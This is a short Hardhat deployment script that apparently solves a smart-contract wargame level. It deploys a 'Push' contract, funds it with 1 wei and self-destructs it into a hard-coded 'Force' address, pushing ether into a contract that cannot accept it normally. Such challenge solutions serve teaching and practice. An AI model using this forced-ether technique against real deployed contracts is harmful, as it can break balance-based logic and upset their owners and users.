const { ethers } = require("hardhat")

async function main() {
  const [deployer] = await ethers.getSigners()

  console.log('Deploying contracts with the account:', deployer.address)

  console.log('Account balance:', (await deployer.getBalance()).toString())

  const ForceAddress = '0x1c2c1a08868f41DA083dD3B75035F0e2a7B9925E';
  const PushFactory = await ethers.getContractFactory('Push');
  const Push = await PushFactory.deploy()
  await Push.deployed();
  console.log('Push contracts has address:', Push.address)

  await Push.fund({value: 1});
  await Push.destroy(ForceAddress);
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })
